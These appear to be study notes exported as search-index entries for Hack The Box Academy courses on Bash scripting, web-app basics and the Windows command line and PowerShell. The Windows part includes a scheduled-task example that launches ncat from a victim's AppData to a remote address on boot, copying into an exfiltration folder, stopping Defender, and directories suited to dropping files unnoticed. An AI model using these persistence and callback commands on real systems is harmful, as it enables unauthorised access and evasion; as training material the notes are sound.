the current user\u2019s -s tests if the file has a size greater than 0 -r tests if the file has read permission -w tests if the file has write permission -x tests if the file has execute permission <pre><code>#!/bin/bash\n\n# Check if the specified file exists\nif [ -e \"$1\" ]\nthen\n    echo -e \"The file exists.\"\n    exit 0\n\nelse\n    echo -e \"The file does not exist.\"\n    exit 2\nfi\n</code></pre> <p>Boolean and Logical Operators</p> <p>We get a boolean value \"<code>false</code>\" or \"<code>true</code>\" as a result with logical operators. Bash gives us the possibility to compare strings by using double square brackets <code>[[ &lt;condition&gt; ]]</code>. To get these boolean values, we can use the string operators. Whether the comparison matches or not, we get the boolean value \"<code>false</code>\" or \"<code>true</code>\".</p> <pre><code>#!/bin/bash\n\n# Check the boolean value\nif [[ -z $1 ]]\nthen\n    echo -e \"Boolean value: True (is null)\"\n    exit 1\n\nelif [[ $# &gt; 1 ]]\nthen\n    echo -e \"Boolean value: True (is greater than)\"\n    exit 1\n\nelse\n    domain=$1\n    echo -e \"Boolean value: False (is equal to)\"\nfi\n</code></pre> <p>Logical Operators</p> Operator Description ! logical negotation NOT &amp;&amp; logical AND || logical OR <pre><code>#!/bin/bash\n\n# Check if the specified file exists and if we have read permissions\nif [[ -e \"$1\" &amp;&amp; -r \"$1\" ]]\nthen\n    echo -e \"We can read the file that has been specified.\"\n    exit 0\n\nelif [[ ! -e \"$1\" ]]\nthen\n    echo -e \"The specified file does not exist.\"\n    exit 2\n\nelif [[ -e \"$1\" &amp;&amp; ! -r \"$1\" ]]\nthen\n    echo -e \"We don't have read permission for this file.\"\n    exit 1\n\nelse\n    echo -e \"Error occured.\"\n    exit 5\nfi\n</code></pre> <p>Exercise Script</p> <pre><code>#!/bin/bash\n\nvar=\"8dm7KsjU28B7v621Jls\"\nvalue=\"ERmFRMVZ0U2paTlJYTkxDZz09Cg\"\n\nfor i in {1..40}\ndo\n        var=$(echo $var | base64)\n\n        # Check if \"var\" contains \"value\" AND has more than 113450 characters\n        if [[ \"$var\" == *\"$value\"* ]] &amp;&amp; [[ $(echo -n \"$var\" | wc -c) -gt 113450 ]]\n        then\n            echo $var | tail -c 20   \n            # output: 2paTlJYTkxDZz09Cg==\n            # echo \"Last 20 characters: ${var: -20}\"  \n            # output: U2paTlJYTkxDZz09Cg==\n        fi\ndone\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Bash%20Scripting/#arithmetic", "title": "Arithmetic", "text": "<p>Arithmetic Operators</p> Operator Description + Addition - Subtraction * Multiplication / Division % Modulus variable++ Increase the value of the variable by 1 variable-- Decrease the value of the variable by 1 <p>Arithmetic.sh</p> <pre><code>#!/bin/bash\n\nincrease=1\ndecrease=1\n\necho \"Addition: 10 + 10 = $((10 + 10))\"\necho \"Subtraction: 10 - 10 = $((10 - 10))\"\necho \"Multiplication: 10 * 10 = $((10 * 10))\"\necho \"Division: 10 / 10 = $((10 / 10))\"\necho \"Modulus: 10 % 4 = $((10 % 4))\"\n\n((increase++))\necho \"Increase Variable: $increase\"\n\n((decrease--))\necho \"Decrease Variable: $decrease\"\n</code></pre> <pre><code>#!/bin/bash\n\nhtb=\"HackTheBox\"\n\n# calculate the length of the variable\necho ${#htb}\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Bash%20Scripting/#input-and-output", "title": "Input and Output", "text": "<p>Output Control</p> <p>The tee utility ensures that we see the results we get immediately and that they are stored in the corresponding files. </p>"}, {"location": "HTB/Academy/Introduction%20to%20Bash%20Scripting/#flow-control-loops", "title": "Flow Control - Loops", "text": "<p>For Loops</p> <pre><code>for variable in file1 file2 file3\ndo\n    echo $variable\ndone\n</code></pre> <pre><code>for ip in \"10.10.10.170 10.10.10.174 10.10.10.175\"\ndo\n    ping -c 1 $ip\ndone\n</code></pre> <p>While Loops</p> <p>WhileBreaker.sh</p> <pre><code>#!/bin/bash\n\ncounter=0\n\nwhile [ $counter -lt 10 ]\ndo\n  # Increase $counter by 1\n  ((counter++))\n  echo \"Counter: $counter\"\n\n  if [ $counter == 2 ]\n  then\n    continue\n  elif [ $counter == 4 ]\n  then\n    break\n  fi\ndone\n</code></pre> <p>Until Loops</p> <p>There is also the <code>until</code> loop, which is relatively rare. Nevertheless, the <code>until</code> loop works precisely like the <code>while</code> loop, but with the difference:</p> <ul> <li>The code inside a <code>until</code> loop is executed as long as the particular condition is <code>false</code>.</li> </ul> <p>The other way is to let the loop run until the desired value is reached. The \"<code>until</code>\" loops are very well suited for this. This type of loop works similarly to the \"<code>while</code>\" loop but, as already mentioned, with the difference that it runs until the boolean value is \"<code>False</code>.\"</p> <pre><code>#!/bin/bash\n\ncounter=0\n\nuntil [ $counter -eq 10 ]\ndo\n  # Increase $counter by 1\n  ((counter++))\n  echo \"Counter: $counter\"\ndone\n</code></pre> <p>Exercise script</p> <pre><code>#!/bin/bash\n\n# Decrypt function\nfunction decrypt {\n    MzSaas7k=$(echo $hash | sed 's/988sn1/83unasa/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/4d298d/9999/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/3i8dqos82/873h4d/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/4n9Ls/20X/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/912oijs01/i7gg/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/k32jx0aa/n391s/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/nI72n/YzF1/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/82ns71n/2d49/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/JGcms1a/zIm12/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/MS9/4SIs/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/Ymxj00Ims/Uso18/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/sSi8Lm/Mit/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/9su2n/43n92ka/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/ggf3iunds/dn3i8/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/uBz/TT0K/g')\n\n    flag=$(echo $MzSaas7k | base64 -d | openssl enc -aes-128-cbc -a -d -salt -pass pass:$salt)\n}\n\n# Variables\nvar=\"9M\"\nsalt=\"\"\nhash=\"VTJGc2RHVmtYMTl2ZnYyNTdUeERVRnBtQWVGNmFWWVUySG1wTXNmRi9rQT0K\"\n\n# Encoding \"var\" 28 times using base64\nfor i in {1..28}\ndo\n    # cannot use echo -n $var | base64\n    var=$(echo $var | base64)\ndone\n\n# Assign salt when i reaches 28\nsalt=$(echo -n $var | wc -c)\n\necho \"The salt value is $salt.\"\n\n# Check if $salt is empty\nif [[ ! -z \"$salt\" ]]\nthen\n    decrypt\n    echo $flag\nelse\n    exit 1\nfi\n</code></pre> <p>echo \"string\" | wc -c counts the exact number of characters in the string returned by echo, that is \"string\" plus a line break appended by echo, so 7 in that case. ${#var} returns the exact number of characters contained in the var variable. You can obtain the same behavior by specifying the -n flag to echo, which gets rid of the trailing \\n.</p> <pre><code>$ echo 9M | base64\nOU0K\n\n$ echo -n 9M | base64\nOU0=\n</code></pre> <p>The sed (Stream Editor) command is used for text processing in Unix/Linux. It allows you to:</p> <ul> <li>Search and replace text</li> <li>Filter and modify strings</li> <li>Delete or insert lines</li> <li>Extract specific parts of text</li> </ul>"}, {"location": "HTB/Academy/Introduction%20to%20Bash%20Scripting/#flow-control-branches", "title": "Flow Control - Branches", "text": "<p>Syntax - Switch-Case</p> <pre><code>case &lt;expression&gt; in\n    pattern_1 ) statements ;;\n    pattern_2 ) statements ;;\n    pattern_3 ) statements ;;\nesac\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Bash%20Scripting/#functions", "title": "Functions", "text": "<p>Method 1 - Functions</p> <pre><code>function name {\n    &lt;commands&gt;\n}\n</code></pre> <p>Method 2 - Functions</p> <pre><code>name() {\n    &lt;commands&gt;\n}\n</code></pre> <p>Parameter Passing</p> <p>PrintPars.sh</p> <pre><code>#!/bin/bash\n\nfunction print_pars {\n    echo $1 $2 $3\n}\n\none=\"First parameter\"\ntwo=\"Second parameter\"\nthree=\"Third parameter\"\n\nprint_pars \"$one\" \"$two\" \"$three\"\n</code></pre> <p>Return Values</p> <p>When we start a new process, each child process (for example, a function in the executed script) returns a return code to the parent process (bash shell through which we executed the script) at its termination, informing it of the status of the execution. This information is used to determine whether the process ran successfully or whether specific errors occurred. Based on this information, the parent process can decide on further program flow.</p> Return Code Description 1 General errors 2 Misuse of shell builtins 126 Command invoked cannot execute 127 Command not found 128 Invalid argument to exit 128+n Fatal error signal \"<code>n</code>\" 130 Script terminated by Control-C 255\\* Exit status out of range <p>To get the value of a function back, we can use several methods like <code>return</code>, <code>echo</code>, or a <code>variable</code>. In the next example, we will see how to use \"<code>$?</code>\" to read the \"<code>return code</code>,\" how to pass the arguments to the function and how to assign the result to a variable.</p> <p>Return.sh</p> <pre><code>#!/bin/bash\n\nfunction given_args {\n\n        if [ $# -lt 1 ]\n        then\n                echo -e \"Number of arguments: $#\"\n                return 1\n        else\n                echo -e \"Number of arguments: $#\"\n                return 0\n        fi\n}\n\n# No arguments given\ngiven_args\necho -e \"Function status code: $?\\n\"\n\n# One argument given\ngiven_args \"argument\"\necho -e \"Function status code: $?\\n\"\n\n# Pass the results of the funtion into a variable\ncontent=$(given_args \"argument\")\n\necho -e \"Content of the variable: \\n\\t$content\"\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Bash%20Scripting/#debugging", "title": "Debugging", "text": "<pre><code>$ bash -x CIDR.sh\n\n# display the output in more details\n$ bash -x -v CIDR.sh\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Web%20App/", "title": "Introduction to Web APPs", "text": ""}, {"location": "HTB/Academy/Introduction%20to%20Web%20App/#url-encoding", "title": "URL Encoding", "text": "<p>An important concept to learn in HTML is URL Encoding, or percent-encoding. For a browser to properly display a page's contents, it has to know the charset in use. In URLs, for example, browsers can only use ASCII encoding, which only allows alphanumerical characters and certain special characters. Therefore, all other characters outside of the ASCII character-set have to be encoded within a URL. URL encoding replaces unsafe ASCII characters with a <code>%</code> symbol followed by two hexadecimal digits.</p> <p>For example, the single-quote character ''' is encoded to '%27', which can be understood by browsers as a single-quote. URLs cannot have spaces in them and will replace a space with either a + (plus sign) or %20. Some common character encodings are:</p> Character Encoding space %20 ! %21 \" %22 # %23 $ %24 % %25 &amp; %26 ' %27 ( %28 ) %29 <p>A full character encoding table can be seen here.</p>"}, {"location": "HTB/Academy/Introduction%20to%20Web%20App/#xss", "title": "XSS", "text": "Type Description Reflected XSS Occurs when user input is displayed on the page after processing (e.g., search result or error message). Stored XSS Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments). DOM XSS Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title). <p>Cross-Site Request Forgery Prevention Cheat Sheet</p>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/", "title": "Introduction to Windows Command Line", "text": ""}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#cmd", "title": "CMD", "text": ""}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#command-prompt-basics", "title": "Command Prompt Basics", "text": "<p>Local Access</p> <ul> <li> <p>Using the Windows key + <code>r</code> to bring up the run prompt, and then typing in cmd. OR</p> </li> <li> <p>Accessing the executable from the drive path <code>C:\\Windows\\System32\\cmd.exe</code>.</p> </li> </ul> <p>Remote Access</p> <p>We can do this through the use of <code>telnet</code>(insecure and not recommended), Secure Shell (<code>SSH</code>), <code>PsExec</code>, <code>WinRM</code>, <code>RDP</code>, or other protocols as needed. For a sysadmin, remote management and access are a boon to our workflow. </p> <p>Basic Usage</p> <pre><code>dir\n</code></pre> <p>Case Study: Windows Recovery</p> <p>boot to <code>Repair Mode</code></p>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#getting-help", "title": "Getting Help", "text": "<pre><code>help\n\nhelp time\n\nhelp ipconfig\n</code></pre> <p>Microsoft Documentation</p> <p>ss64 Is a handy quick reference for anything command-line related, including cmd, PowerShell, Bash, and more.</p> <pre><code>ipconfig /all\nsysteminfo\n# clear the screen\ncls\n\n# command history\ndoskey /history\n</code></pre> Key/Command Description doskey /history doskey /history will print the session's command history to the terminal or output it to a file when specified. page up Places the first command in our session history to the prompt. page down Places the last command in history to the prompt. \u21e7 Allows us to scroll up through our command history to view previously run commands. \u21e9 Allows us to scroll down to our most recent commands run. \u21e8 Types the previous command to prompt one character at a time. \u21e6 N/A F3 Will retype the entire previous entry to our prompt. F5 Pressing F5 multiple times will allow you to cycle through previous commands. F7 Opens an interactive list of previous commands. F9 Enters a command to our prompt based on the number specified. The number corresponds to the commands place in our history."}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#system-navigation", "title": "System Navigation", "text": "<p>Listing the Contents of the File System:</p> <pre><code>tree\ntree /F\n</code></pre> <p>Interesting Directories</p> Name: Location: Description: %SYSTEMROOT%\\Temp C:\\Windows\\Temp Global directory containing temporary system files accessible to all users on the system. All users, regardless of authority, are provided full read, write, and execute permissions in this directory. Useful for dropping files as a low-privilege user on the system. %TEMP% C:\\Users\\\\AppData\\Local\\Temp Local directory containing a user's temporary files accessible only to the user account that it is attached to. Provides full ownership to the user that owns this folder. Useful when the attacker gains control of a local/domain joined user account. %PUBLIC% C:\\Users\\Public Publicly accessible directory allowing any interactive logon account full access to read, write, modify, execute, etc., files and subfolders within the directory. Alternative to the global Windows Temp Directory as it's less likely to be monitored for suspicious activity. %ProgramFiles% C:\\Program Files folder containing all 64-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system. %ProgramFiles(x86)% C:\\Program Files (x86) Folder containing all 32-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system."}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#working-with-directories-and-files", "title": "Working with Directories and Files", "text": "<pre><code># create a new directory\nmd new-directory\nmkdir yet-another-dir\n\n# delete a directory\nrd Git-Pulls\nrd /S Git-Pulls\n\n# move a directory\ntree example /F\nmove example C:\\Users\\htb\\Documents\\example\n\n# copy a directory\n# /E told Xcopy to copy any files and subdirectories to include empty directories.\nxcopy C:\\Users\\htb\\Documents\\example C:\\Users\\htb\\Desktop\\ /E\n\nrobocopy C:\\Users\\htb\\Desktop C:\\Users\\htb\\Documents\\\n\nrobocopy /E /B /L C:\\Users\\htb\\Desktop\\example C:\\Users\\htb\\Documents\\Backup\\\n\nrobocopy /E /MIR /A-:SH C:\\Users\\htb\\Desktop\\notes\\ C:\\Users\\htb\\Documents\\Backup\\Files-to-exfil\\\n\n# list files and view their contents\nmore secrets.txt\n\nmore /S secrets.txt\n\nipconfig /all | more\n\ntype bio.txt\n\ntype passwords.txt &gt;&gt; secrets.txt\n\n# Echo to Create and Append Files\necho Check out this text &gt; demo.txt\necho More text for our demo file &gt;&gt; demo.txt\n\n# Fsutil to Create a file\nfsutil file createNew for-sure.txt 222\necho \" my super cool text file from fsutil \"&gt; for-sure.txt\n\n# Ren(ame) A file\nren demo.txt superdemo.txt\n\n# Output To A File\nipconfig /all &gt; details.txt\n\n# Append to a File\necho f g h i j k see how this works now? &gt;&gt; test.txt\n\n# Pass in a Text File to a Command\n# the result is showing us the line where it found see\nfind /i \"see\" &lt; test.txt\n\n# Run A Then B\n# It does not care if the command succeeded or failed. It just issues them.\nping 8.8.8.8 &amp; type test.txt\n\n# State Dependent &amp;&amp;\n# &amp;&amp; to run command A, and if it succeeds, run command B\ncd C:\\Users\\student\\Documents\\Backup &amp;&amp; echo 'did this work' &gt; yes.txt\n\n# Dynamic Del And Erase\ndel file-1\n\n# Using Del And Erase to remove a list of files\nerase file-3 file-5\n\n# View Files With the Read-only Attribute\ndir /A:R\n\n# Delete a Read-only File\ndel /A:R *\n\n# Viewing Hidden Files\ndir /A:H\n\n# Removing Hidden Files\ndel /A:H *\n\n# Copying and Moving Files\ncopy secrets.txt C:\\Users\\student\\Downloads\\not-secrets.txt\n\n# Copy Validation\ncopy calc.exe C:\\Users\\student\\Downloads\\copied-calc.exe /V\n\nmove C:\\Users\\student\\Desktop\\bio.txt C:\\Users\\student\\Downloads\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#gathering-system-information", "title": "Gathering System Information", "text": "<pre><code># Systeminfo Output\nsysteminfo\n\n# Hostname Output\nhostname\n\n# Ver Output\nver\n\n# Ipconfig Without Parameters\nipconfig \n\n# Utilizing ARP to Find Additional Hosts\narp /a\n\n# Understanding Our Current User\nwhoami\nwhoami /all\n\n# Checking Out Our Privileges\nwhoami /priv\n\n# Investigating Groups\nwhoami /groups\n\n# Investigating Other Users/Groups\nnet user\nnet group\n\n# Exploring Resources on the Network\nnet share  \n\nnet view  \n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#finding-files-and-directories", "title": "Finding Files and Directories", "text": "<pre><code>where calc.exe\n\nwhere /R C:\\Users\\student\\ bio.txt\n\nwhere /R C:\\Users\\student\\ *.csv\n\nGet-ChildItem -Path C:\\ -Filter *.txt -Recurse\n\ngci C:\\ -Filter *.txt -Recurse\n\nfind \"password\" \"C:\\Users\\student\\not-passwords.txt\" \n\n# /N switch to display line numbers for us and the /I display to ignore case sensitivity\n# use /V with the search string password against a file, it will show us any line that does not have the specified string\nfind /N /I /V \"IP Address\" example.txt  \n\n# The findstr command is similar to find in that it searches through files but for patterns instead. It will look for anything matching a pattern, regex value, wildcards, and more. Think of it as find2.0. For those familiar with Linux, findstr is closer to grep.\nfindstr  \n\n# Compare\n# Comp will check each byte within two files looking for differences and then displays where they start.\ncomp .\\file-1.md .\\file-2.md\n\n# Compares two files or sets of files and displays the differences between them\nfc.exe /?\n\n# print the line numbers and the ASCII comparison using the /N modifier\nfc passwords.txt modded.txt /N\n\n# feeding the contents of the file file to sort\nsort.exe .\\file-1.md /O .\\sort-1.md\n\nsort.exe .\\sort-1.md /unique\n</code></pre> <p>Get-ChildItem -Path C:\\ -Filter waldo.txt -Recurse</p>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#environment-variables", "title": "Environment Variables", "text": "<pre><code>%SUPER_IMPORTANT_VARIABLE%\n\n# Showcasing Global Variables\necho %WINDIR%\n\n# Showcasing Local Variables\nset SECRET=HTB{5UP3r_53Cr37_V4r14813}\necho %SECRET%\n\n# Display with Set\n&gt;set %SYSTEMROOT%\n\nEnvironment variable C:\\Windows not defined\n\n# Display with Echo\necho %PATH%\n</code></pre> <p>Both <code>set</code> and <code>setx</code> are command line utilities that allow us to display, set, and remove environment variables. The difference lies in how they achieve those goals. The <code>set</code> utility only manipulates environment variables in the current command line session. This means that once we close our current session, any additions, removals, or changes will not be reflected the next time we open a command prompt. Suppose we need to make permanent changes to environment variables. In that case, we can use <code>setx</code> to make the appropriate changes to the registry, which will exist upon restart of our current command prompt session.</p> <pre><code>set DCIP=172.16.5.2\necho %DCIP%\n\nsetx DCIP 172.16.5.2\n\nsetx DCIP \"\"\n\nC:\\htb&gt; set DCIP\nEnvironment variable DCIP not defined\n\nC:\\htb&gt; echo %DCIP%\n%DCIP%\n</code></pre> <p>Important Environment Variables</p> Variable Name Description %PATH% Specifies a set of directories(locations) where executable programs are located. %OS% The current operating system on the user's workstation. %SYSTEMROOT% Expands to C:\\Windows. A system-defined read-only variable containing the Windows system folder. Anything Windows considers important to its core functionality is found here, including important data, core system binaries, and configuration files. %LOGONSERVER% Provides us with the login server for the currently active user followed by the machine's hostname. We can use this information to know if a machine is joined to a domain or workgroup. %USERPROFILE% Provides us with the location of the currently active user's home directory. Expands to C:\\Users\\{username}. %ProgramFiles% Equivalent of C:\\Program Files. This location is where all the programs are installed on an x64 based system. %ProgramFiles(x86)% Equivalent of C:\\Program Files (x86). This location is where all 32-bit programs running under WOW64 are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (x86 vs. x64 architecture)"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#managing-services", "title": "Managing Services", "text": "<pre><code>sc\nsc query type= service\n\n# Querying for Windows Defender\nsc query windefend \n\n# Stopping an Elevated Service\nsc stop windefend\n\n# Finding the Print Spooler Service\nsc query Spooler\n\nsc stop Spooler\n\n# Starting Services\nsc start Spooler\n\n# Modifying Services\n# Checking the State of the Required Services\nsc query wuauserv\n\nsc query bits\n\nsc stop bits\n\nsc config wuauserv start= disabled\n\nsc config bits start= disabled\n\nsc start wuauserv \n\n# Other Routes to Query Services\ntasklist /svc\n\n# using net start without specifying a service will list all of the active services on the system.\nnet start\n\nwmic service list brief\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#working-with-scheduled-tasks", "title": "Working With Scheduled Tasks", "text": "Action Parameter Description Query Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user. /fo Sets formatting options. We can specify to show results in the Table, List, or CSV output. /v Sets verbosity to on, displaying the advanced properties set in displayed tasks when used with the List or CSV output parameter. /nh Simplifies the output using the Table or CSV output format. This switch removes the column headers. /s Sets the DNS name or IP address of the host we want to connect to. Localhost is the default specified. If /s is utilized, we are connecting to a remote host and must format it as \"\\host\". /u This switch will tell schtasks to run the following command with the permission set of the user specified. /p Sets the password in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The u and p values are only valid when used with the s parameter. <pre><code>schtasks /?\n\nSCHTASKS /Query /V /FO list\n</code></pre> Action Parameter Description Create Schedules a task to run. /sc Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters. /tn Sets the name for the task we are building. Each task must have a unique name. /tr Sets the trigger and task that should be run. This can be an executable, script, or batch file. /s Specify the host to run on, much like in Query. /u Specifies the local user or domain user to utilize /p Sets the Password of the user-specified. /mo Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day. /rl Allows us to limit the privileges of the task. Options here are limited access and Highest. Limited is the default value. /z Will set the task to be deleted after completion of its actions. <pre><code># New Task Creation\nschtasks /create /sc ONSTART /tn \"My Secret Task\" /tr \"C:\\Users\\Victim\\AppData\\Local\\ncat.exe 172.16.1.100 8100\"\n</code></pre> <p>Change the Properties of a Scheduled Task</p> Action Parameter Description Change Allows for modifying existing scheduled tasks. /tn Designates the task to change /tr Modifies the program or action that the task runs. /ENABLE Change the state of the task to Enabled. /DISABLE Change the state of the task to Disabled. <pre><code>schtasks /change /tn \"My Secret Task\" /ru administrator /rp \"P@ssw0rd\"\n\nschtasks /query /tn \"My Secret Task\" /V /fo list \n</code></pre> <p>Delete the Scheduled Task(s)</p> Action Parameter Description Delete Remove a task from the schedule /tn Identifies the task to delete. /s Specifies the name or IP address to delete the task from. /u Specifies the user to run the task as. /p Specifies the password to run the task as. /f Stops the confirmation warning. <pre><code>schtasks /delete  /tn \"My Secret Task\" \n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#powershell", "title": "PowerShell", "text": ""}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#cmd-vs-powershell", "title": "CMD Vs. PowerShell", "text": "<pre><code>Get-Help Test-Wsman\n\nGet-Help Test-Wsman -online\n\n# ensure we have the most up-to-date information for each cmdlet\nUpdate-Help\n\nGet-Location\n\n# display the contents of our current directory or the one we specify\nGet-ChildItem \n\n# Changing our location\nSet-Location .\\Documents\\\n\n# Display Contents of a File\nGet-Content Readme.md \n\n# find a pesky command that might be slipping from our memory right when we need to use it\nGet-Command\n\nGet-Command -verb get\n\nGet-Command -noun windows*  \n\n# By default, PowerShell keeps the last 4096 commands entered, but this setting can be modified by changing the $MaximumHistoryCount variable.\n# By default, Get-History will only show the commands that have been run during this active session\nGet-History\n\n# Viewing PSReadLine History\nget-content C:\\Users\\DLarusso\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n\n# Clear Screen\nClear-Host\nclear\ncls\n</code></pre> <p>Hotkeys</p> HotKey Description CTRL+R It makes for a searchable history. We can start typing after, and it will show us results that match previous commands. CTRL+L Quick screen clear. CTRL+ALT+Shift+? This will print the entire list of keyboard shortcuts PowerShell will recognize. Escape When typing into the CLI, if you wish to clear the entire line, instead of holding backspace, you can just hit escape, which will erase the line. \u2191 Scroll up through our previous history. \u2193 Scroll down through our previous history. F7 Brings up a TUI with a scrollable interactive history from our session. <pre><code>Get-Alias\n# the Get-Alias cmdlet has a default alias of gal\ngal\n\nSet-Alias -Name gh -Value Get-Help\n</code></pre> <p>Helpful Aliases</p> Alias Description pwd gl can also be used. This alias can be used in place of Get-Location. ls dir and gci can also be used in place of ls. This is an alias for Get-ChildItem. cd sl and chdir can be used in place of cd. This is an alias for Set-Location. cat type and gc can also be used. This is an alias for Get-Content. clear Can be used in place of Clear-Host. curl Curl is an alias for Invoke-WebRequest, which can be used to download files. wget can also be used. fl and ft These aliases can be used to format output into list and table outputs. man Can be used in place of help."}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#all-about-cmdlets-and-modules", "title": "All About Cmdlets and Modules", "text": "<p>A cmdlet as defined by Microsoft is:</p> <p>\"a single-feature command that manipulates objects in PowerShell.\"</p> <p>A PowerShell module is structured PowerShell code that is made easy to use &amp; share. As mentioned in the official Microsoft docs, a module can be made up of the following:</p> <ul> <li>Cmdlets</li> <li>Script files</li> <li>Functions</li> <li>Assemblies</li> <li>Related resources (manifests and help files)</li> </ul> <p>Using PowerShell Modules</p> <pre><code>Get-Module\n\n# The -ListAvailable modifier will show us all modules we have installed but not loaded into our session.\nGet-Module -ListAvailable\n\nGet-Help Import-Module\n\nImport-Module .\\PowerSploit.psd1\nGet-NetLocalgroup\n\n# Viewing PSModulePath\n$env:PSModulePath\n\n# Checking Execution Policy State\nGet-ExecutionPolicy \n\nSet-ExecutionPolicy undefined \n\nSet-ExecutionPolicy -scope Process \nGet-ExecutionPolicy -list\n\n# Calling Cmdlets and Functions From Within a Module\nGet-Command -Module PowerSploit\n</code></pre> <p>The PowerShell Gallery is a repository that contains PowerShell scripts, modules, and more created by Microsoft and other users. They can range from anything as simple as dealing with user attributes to solving complex cloud storage issues.</p> <p><code>PowerShellGet</code> is a module built into PowerShell meant to help us interact with the PowerShell Gallery.</p> <pre><code>Get-Command -Module PowerShellGet \n\nFind-Module -Name AdminToolbox | Install-Module\n</code></pre> <p>Tools To Be Aware Of</p> <ul> <li> <p>AdminToolbox: AdminToolbox is a collection of helpful modules that allow system administrators to perform any number of actions dealing with things like Active Directory, Exchange, Network management, file and storage issues, and more.</p> </li> <li> <p>ActiveDirectory: This module is a collection of local and remote administration tools for all things Active Directory. We can manage users, groups, permissions, and much more with it.</p> </li> <li> <p>Empire / Situational Awareness: Is a collection of PowerShell modules and scripts that can provide us with situational awareness on a host and the domain they are apart of. This project is being maintained by BC Security as a part of their Empire Framework.</p> </li> <li> <p>Inveigh: Inveigh is a tool built to perform network spoofing and Man-in-the-middle attacks.</p> </li> <li> <p>BloodHound / SharpHound: Bloodhound/Sharphound allows us to visually map out an Active Directory Environment using graphical analysis tools and data collectors written in C# and PowerShell.</p> </li> </ul>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#user-and-group-management", "title": "User and Group Management", "text": "<p>Built-In Accounts</p> Account Description Administrator This account is used to accomplish administrative tasks on the local host. Default Account The default account is used by the system for running multi-user auth apps like the Xbox utility. Guest Account This account is a limited rights account that allows users without a normal user account to access the host. It is disabled by default and should stay that way. WDAGUtility Account This account is in place for the Defender Application Guard, which can sandbox application sessions. <p>Domain users differ from local users in that they are granted rights from the domain to access resources such as file servers, printers, intranet hosts, and other objects based on user and group membership. Domain user accounts can log in to any host in the domain, while the local user only has permission to access the specific host they were created on.</p> <pre><code>get-localgroup\n\nGet-LocalUser  \n\nNew-LocalUser -Name \"JLawrence\" -NoPassword\n\n$Password = Read-Host -AsSecureString\nSet-LocalUser -Name \"JLawrence\" -Password $Password -Description \"CEO EagleFang\"\n\nGet-LocalGroup  \n\nGet-LocalGroupMember -Name \"Users\"\n\nAdd-LocalGroupMember -Group \"Remote Desktop Users\" -Member \"JLawrence\"\nGet-LocalGroupMember -Name \"Remote Desktop Users\" \n\n# install RSAT (Remote System Administration Tools) to get the official ActiveDirectory PowerShell module\nGet-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online\n\n# Locating The AD Module\nGet-Module -Name ActiveDirectory -ListAvailable \n\nGet-ADUser -Filter *\n\nGet-ADUser -Identity TSilver\n\nGet-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}\n\n# add new AD user\nNew-ADUser -Name \"MTanaka\" -Surname \"Tanaka\" -GivenName \"Mori\" -Office \"Security\" -OtherAttributes @{'title'=\"Sensei\";'mail'=\"MTanaka@greenhorn.corp\"} -Accountpassword (Read-Host -AsSecureString \"AccountPassword\") -Enabled $true \n\nGet-ADUser -Identity MTanaka -Properties * | Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail\n\n# Changing a Users Attributes\nSet-ADUser -Identity MTanaka -Description \" Sensei to Security Analyst's Rocky, Colt, and Tum-Tum\"  \n\nGet-ADUser -Identity MTanaka -Property Description\n\nGet-ADUser -Filter {GivenName -like '*Robert*'}\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#working-with-files-and-directories", "title": "Working with Files and Directories", "text": "<p>Common Commands Used for File &amp; Folder Management</p> Command Alias Description Get-Item gi Retrieve an object (could be a file, folder, registry object, etc.) Get-ChildItem ls / dir / gci Lists out the content of a folder or registry hive. New-Item md / mkdir / ni 